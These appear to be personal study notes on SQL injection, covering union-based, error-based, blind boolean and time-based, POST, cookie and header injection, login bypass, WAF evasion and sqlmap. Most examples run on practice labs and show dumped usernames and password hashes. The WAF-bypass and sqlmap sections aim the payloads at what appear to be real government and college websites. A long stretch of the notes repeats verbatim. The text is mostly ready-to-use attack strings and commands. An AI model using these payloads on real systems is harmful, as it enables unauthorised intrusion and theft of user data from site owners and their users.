Union SQl Injection
->testphp.vulnweb.com

-> find a parameter
test wether it has an sql database or not
->Check errors

http://testphp.vulnweb.com/listproducts.php?cat=1
http://testphp.vulnweb.com/listproducts.php?cat=1'

->Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1 Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74 

->http://testphp.vulnweb.com/listproducts.php?cat=1' order by 1--+
->remove '
->http://testphp.vulnweb.com/listproducts.php?cat=1 order by 1--+
->http://testphp.vulnweb.com/listproducts.php?cat=1 order by 5--+
->http://testphp.vulnweb.com/listproducts.php?cat=1 order by 7--+
->http://testphp.vulnweb.com/listproducts.php?cat=1 order by 10--+
->http://testphp.vulnweb.com/listproducts.php?cat=1 order by 11--+
->http://testphp.vulnweb.com/listproducts.php?cat=1 order by 12--+
-> Error: Unknown column '12' in 'order clause' Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
search art
-->Unknown column<--
--> know we know that we have 
->http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11--+
->we get vulnerable tables 
2,7,9


->version()
->database()
->http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables--+
->It will give us list of table name now we know which table to use/select
->>"users"
->now we need columns
->>http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,column_name,8,9,10,11 from information_schema.columns where table_name="users"--+
->now we know we have column names like-->>>>>>>>>>uname,pass,address,email,name
->juicy info kha se mil sakta hen
->uname,pass,address
->so 
->
->http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,group_concat(uname,':',pass),8,9,10,11 from users--+

-> and we get username and password





union-> union is an sql operator ,it's job is to combine the result of two or more select statement into a single result which is then returned as a part of HTTP response.

->order by is used for sorting

->Select->
A select query is a database object that shows information in Datasheet view

what is information schema?
->
Information schema is a structure set which store metadata and other information about tabls,views,columns and procedures in a database 

Database ki mummy


____________________________

find input
produce error
find the number columns
we could use union operator

so that we could find vulnerable columns

we can add querry or ask database for juicy information 



1'
 order by 1,2,3,4 jab tak apko number of column nhi pta chal jate

 11 columns

1 union select 1,2,3,4,5,6,7,8,9,10,11--+

vulnerable columns---> 7,2,9


database->table-columns



1 union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables--+


table name===users


1 union select 1,2,3,4,5,6,7,8,column_name,10,11 from information_schema.columns where table_name='users'--+


columns of table jiska nam kya hen ---> users



uname,pass,cc,addres


1 union select 1,2,3,4,5,6,group_concat(uname,"//",pass,"//",cc),8,9,10,11 from users--+

Sql malicious codes

Learn SQLi Query Fixing 

1. identify sqli vulnerability 
'
"
\

2. balance the query 

http://192.168.1.103/sqli-labs-master/Less-1/?id=1 {front end }

select id ='id' where name ='xyz' {background}


how to fix 

http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --+

select id ='1'    --+' where name ='xyz' {background}

Less-2 

in background 

select id=1  --+where name =xyz

how to fix query 

http://192.168.1.103/sqli-labs-master/Less-2/?id=1   --+

Less-3 

in background 
select id = ('1\') where name =('xyz')

--------------------------------------------
SQLI Through Get Based 

Less-1 

http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --+ {balanced query }

1. find total no of vulnerable columns 

order by 1{same page }

order by 2 {same page }


order by n {different page }

there is n-1 columns are prsenet

http://192.168.1.103/sqli-labs-master/Less-1/?id=1' order by 1  --+  

2. find exact no of vulnerable columns out of these n-1 

union all select 1,2,...n-1 

example 

union all select 1,2,3

select id=-1' union all select 1,2,3  --+where name =xyz 


executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,2,3 --+

3. execute any datbase sqli query there 

on that reflect no 

example - database()

version()

user()

executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),3 --+

http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),user() --+

--------------------------------------------

situtation you are getting error but you are not getting output of union sqli staement in that case there may error based sqli or may be double query based sqli 


http://192.168.1.103/sqli-labs-master/Less-5/?id=-1'       --+


error/double based sqli query -> hackbar->error/double->get database 

-----------------------------------------
Blind SQLI 

blind boolien based sqli 

and 1=1 {true }

and 1=2 {false }

and "a"="b"

and database()="xyz"

we can not assume the database 

and substring(database(),1,1)="a"

http://192.168.1.103/sqli-labs-master/Less-8/?id=1'    and substring(database(),1,1)="s"  --+ {true vale that menas first charcater of first databse is s}


http://192.168.1.103/sqli-labs-master/Less-8/?id=1'    and substring(database(),2,1)="e"  --+ {true second character of first database is e}

blind time based sqli 

' and sleep(10) --+
" and sleep(10) --+

') and sleep(10) --+

how to extract database for blind time based sqli 

' and sleep(10) and 1=1 --+

i gave http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="security" --+ its sleeping thats means 

http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="xyz" --+ {its not sleeping for 10 sec }
-----------------------------------------

Exploitation of GET Based sqli 

1. Database List - 

hackbar->union->database->group_concat 

information_schema
challenges
dvwa
metasploit
mysql
owasp10
security
tikiwiki
tikiwiki195

2.find tables of a database -dvwa 

hackbar->union->tables->group_concat 

guestbook
users

3. find columns of a table - guestbook 

comment_id
comment
name


4. data of that columns 

name,comment 

hackbar->union->data->group_concat

name,"<------>",comment,"---->",third


Error Based Double Query Exploitaion 

what about other database 

for if want to fetch remaining database 

you have to increase first value of first limit 

LIMIT+1,1 - challenges 

LIMIT+2,1 - dvwa 

LIMIT 3,1 - metasploit 

tables 

default tables 
LIMIT+0,1 -  guestbook 

LIMIT+1,1 - users 


LIMIT+2,1 -- you are not getting aything that means there is only two tables 


columns for double query based 

LIMIT+0,1   - user_id 

LIMIT+1,1.   ---  first_name 

LIMIT+2,1)). --- last_name 

LIMIT+3,1)). ---- user 

LIMIT+4,1)).  --- password 

LIMIT+5,1)). -- avatar 

LIMIT+0,1)). ---- nothing 

Data of these columns 
user        password 
admin		5f4dcc3b5aa765d61d8327deb882cf99
gordonb		e99a18c428cb38d5f260853678922e03
1337 		8d3533d75ae2c3966d7e0d4fcc69216b
pablo




Learn SQLi Query Fixing 

1. identify sqli vulnerability 
'
"
\

2. balance the query 

http://192.168.1.103/sqli-labs-master/Less-1/?id=1 {front end }

select id ='id' where name ='xyz' {background}


how to fix 

http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --  

select id ='1'    --  ' where name ='xyz' {background}

Less-2 

in background 

select id=1  --  where name =xyz

how to fix query 

http://192.168.1.103/sqli-labs-master/Less-2/?id=1   --  

Less-3 

in background 
select id = ('1\') where name =('xyz')

--------------------------------------------
SQLI Through Get Based 

Less-1 

http://192.168.1.103/sqli-labs-master/Less-1/?id=1'   --   {balanced query }

1. find total no of vulnerable columns 

order by 1{same page }

order by 2 {same page }


order by n {different page }

there is n-1 columns are prsenet

http://192.168.1.103/sqli-labs-master/Less-1/?id=1' order by 1  --    

2. find exact no of vulnerable columns out of these n-1 

union all select 1,2,...n-1 

example 

union all select 1,2,3

select id=-1' union all select 1,2,3  --  where name =xyz 


executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,2,3 --  

3. execute any datbase sqli query there 

on that reflect no 

example - database()

version()

user()

executed - http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),3 --  

http://192.168.1.103/sqli-labs-master/Less-1/?id=-1' union all select 1,database(),user() --  

--------------------------------------------

situtation you are getting error but you are not getting output of union sqli staement in that case there may error based sqli or may be double query based sqli 


http://192.168.1.103/sqli-labs-master/Less-5/?id=-1'       --  


error/double based sqli query -> hackbar->error/double->get database 

-----------------------------------------
Blind SQLI 

blind boolien based sqli 

and 1=1 {true }

and 1=2 {false }

and "a"="b"

and database()="xyz"

we can not assume the database 

and substring(database(),1,1)="a"

http://192.168.1.103/sqli-labs-master/Less-8/?id=1'    and substring(database(),1,1)="s"  --   {true vale that menas first charcater of first databse is s}


http://192.168.1.103/sqli-labs-master/Less-8/?id=1'    and substring(database(),2,1)="e"  --   {true second character of first database is e}

blind time based sqli 

' and sleep(10) --  
" and sleep(10) --  

') and sleep(10) --  

how to extract database for blind time based sqli 

' and sleep(10) and 1=1 --  

i gave http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="security" --   its sleeping thats means 

http://192.168.1.103/sqli-labs-master/Less-9/?id=1'   and sleep(10) and database()="xyz" --   {its not sleeping for 10 sec }
-----------------------------------------

Exploitation of GET Based sqli 

1. Database List - 

hackbar->union->database->group_concat 

information_schema
challenges
dvwa
metasploit
mysql
owasp10
security
tikiwiki
tikiwiki195

2.find tables of a database -dvwa 

hackbar->union->tables->group_concat 

guestbook
users

3. find columns of a table - guestbook 

comment_id
comment
name


4. data of that columns 

name,comment 

hackbar->union->data->group_concat

name,"<------>",comment,"---->",third


Error Based Double Query Exploitaion 

what about other database 

for if want to fetch remaining database 

you have to increase first value of first limit 

LIMIT  1,1 - challenges 

LIMIT  2,1 - dvwa 

LIMIT 3,1 - metasploit 

tables 

default tables 
LIMIT  0,1 -  guestbook 

LIMIT  1,1 - users 


LIMIT  2,1 -- you are not getting aything that means there is only two tables 


columns for double query based 

LIMIT  0,1   - user_id 

LIMIT  1,1.   ---  first_name 

LIMIT  2,1)). --- last_name 

LIMIT  3,1)). ---- user 

LIMIT  4,1)).  --- password 

LIMIT  5,1)). -- avatar 

LIMIT  0,1)). ---- nothing 

Data of these columns 
user        password 
admin		5f4dcc3b5aa765d61d8327deb882cf99
gordonb		e99a18c428cb38d5f260853678922e03
1337 		8d3533d75ae2c3966d7e0d4fcc69216b
pablo


-------------------------------------------
Post Based SQLI 

Balnace the query 

' --  

problem is    is not working with post based 

instead of    use space (  )

or you can also use # to fix 

# is alos used for comment out part of sqli qyery 

-- or # 

find total no of vulnerable columns 

order by 1 

find exact no of vulnerable columns 

'  union all select 1,2  #

execute database query 


'  union all select database(),user()  #

Less -12 

") union all select 1,2 #

") union all select database(),user() #


Less-13 

') #
') order by 3#

') order by 2 # {order by 2 worked }

') union all select 1,2#

situtation you are getting error but you are not getting output of union sqli staement in that case there may error based sqli or may be double query based sqli 

"   AND(SELECT  1  from(SELECT  COUNT(*),CONCAT((SELECT  (SELECT  (SELECT  DISTINCT  CONCAT(0x7e,0x27,CAST(schema_name  AS  CHAR),0x27,0x7e)  FROM  INFORMATION_SCHEMA.SCHEMATA  WHERE  table_schema!=DATABASE()  LIMIT  1,1))  FROM  INFORMATION_SCHEMA.TABLES  LIMIT  0,1),  FLOOR(RAND(0)*2))x  FROM  INFORMATION_SCHEMA.TABLES  GROUP  BY  x)a)  AND  1=1  #


------------------------------------------

Blind boolien post based sqli 

Less-15 

'  OR 1=1  #

" OR 1=1 #

') OR 1=1 #

") OR 1=1 #


'  OR database()="security"  #

'  OR substring(database(),1,1)="a"  #

'  OR substring(database(),1,1)="s"  #
first character of database is s 

'  OR substring(database(),2,1)="e"  #

second character of database is e 


Less-16 

Blind time based 
' OR sleep(10) #
" OR sleep(10) #
') OR sleep(10) #
") OR sleep(10) # {worked}

") OR sleep(10) and 1=1  #

") OR sleep(10) and substring(database(),3,1)="a"  #

application is sleeping when we fired this 

") OR sleep(10) and substring(database(),3,1)="c"  #

that means third character of database is c 

Less-17 

understand the busines slogic here 

password reset require existing user 


default username for this lab is admin 

------------------------------------------
Exploitation of POST Based SQLI 

Less-11

inject database query 

1. database list 

hackbar -> union -> database-> group_concat 

' union all select (SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),2 #

information_schema
challenges
dvwa
metasploit
mysql
owasp10
security
tikiwiki
tikiwiki195


2. find table of a database - security

' union all select (SELECT  GROUP_CONCAT(table_name  SEPARATOR  0x3c62723e)  FROM  INFORMATION_SCHEMA.TABLES  WHERE  TABLE_SCHEMA=0x7365637572697479),2 #

emails
referers
uagents
users

3. find columns of a table - users 

hackbar->union->columns->group_concat 

' union all select (SELECT  GROUP_CONCAT(column_name  SEPARATOR  0x3c62723e)  FROM  INFORMATION_SCHEMA.COLUMNS  WHERE  TABLE_NAME=0x7573657273),2 #


user_id
first_name
last_name
user
password
avatar
id
username
password

4. data of these columns - user,password 

user,"<----->",password

' union all select 1,(SELECT  GROUP_CONCAT(username,"<----->",password  SEPARATOR  0x3c62723e)  FROM  security.users) #



Error Based Double Query Exploitaion  Post Method 

')   AND(SELECT  1  from(SELECT  COUNT(*),CONCAT((SELECT  (SELECT  (SELECT  DISTINCT  CONCAT(0x7e,0x27,CAST(schema_name  AS  CHAR),0x27,0x7e)  FROM  INFORMATION_SCHEMA.SCHEMATA  WHERE  table_schema!=DATABASE()  LIMIT  3,1))  FROM  INFORMATION_SCHEMA.TABLES  LIMIT  0,1),  FLOOR(RAND(0)*2))x  FROM  INFORMATION_SCHEMA.TABLES  GROUP  BY  x)a)  AND  1=1 #

-------------------------------------------

Header Based sqli 

if any application will have to store your headers info into their database there may be headers based sqli 

if you will be loged in an application 


------------------------------------------
Cookie Based SQLI 

target - testphp.vulnweb.com 

Balance Query 

'  -- 


' and 'x'='x

select login='test/test'  and 'x'='x   ' where something other part of query 


-------------------------------------------
Header Based sqli 

balnace query 

' --

' and 'a'='a



select referrer='value ' OR SLEEP(5) and 'a'='a ' somethingother part of query 


-------------------------------------------

waf bypassing 

earlier i tried 

' order by 1 --+


when i tried 

' union all select 1,2,3,4,5,6,7 --+

i got not acceptable error 

either union may be illegal keyword 

may be all will be illegal input 

select 

illegal word (word)= /*!12345word*/

' /*!12345union*/ all select 1,2,3 --+

http://multan.gov.pk/page.php?data=-2' /*!12345union*/ all select 1,2,database(),4,5,6,7 --+

now exploit this 
all database list

hackbar->union->database->group_concat 
on any reflect no 

(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)



' /*!12345union*/ all select 1,2,(SELECT+/*!12345GROUP_CONCAT*/(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 --+



--------------------------------------------
Authentication Bypasing through SQLI 

lets assuem background of login page 

select username ='value1'&password='value2' where someother part of query 

value1 = '   OR 1=1 -- 

select username =''   OR 1=1 -- 	'&password='value2' where someother part of query 


value1= 1' OR '1'='1

select username ='1' OR '1'='1	'&password='value2' where someother part of query 

Less-11 

---------------------------------------

SQLMAP GET Based 

python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner 


1. database list 

--dbs 

example 

python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner --dbs 

2. find tables of a database - dvwa 

-D DBNAME --tables 

example 
python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner -D dvwa --tables 


3. columns of any table - users 

-D DBNAME -T TBNAME --columns 

example : 
python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner -D dvwa -T users --columns 

4. data of these columns - user,first_name,password 

-D DBNAME -T TBNAME -C col1,col2,col3 --dump

example : 

python sqlmap.py -u "http://192.168.0.103/sqli-labs-master/Less-1/?id=1*" --batch --banner -D dvwa -T users -C user,first_name,password --dump


------------------------------------------
POST | Header | and Cookie based SQLI through SQLmap 

commands 

python sqlmap.py -r requestfile --batch --banner 

python sqlmap.py -r less11.txt --batch --banner



WAF Bypass with sqlmap 

sqlmap.py -u "URL" --batch --banner --tamper=modsecurityversioned 


python sqlmap.py -u "http://multan.gov.pk/page.php?data=50*" --batch --banner --tamper=modsecurityversioned 




python sqlmap.py -u "http://citicollege.edu.pk/main.php?Id=1*" --batch --banner 







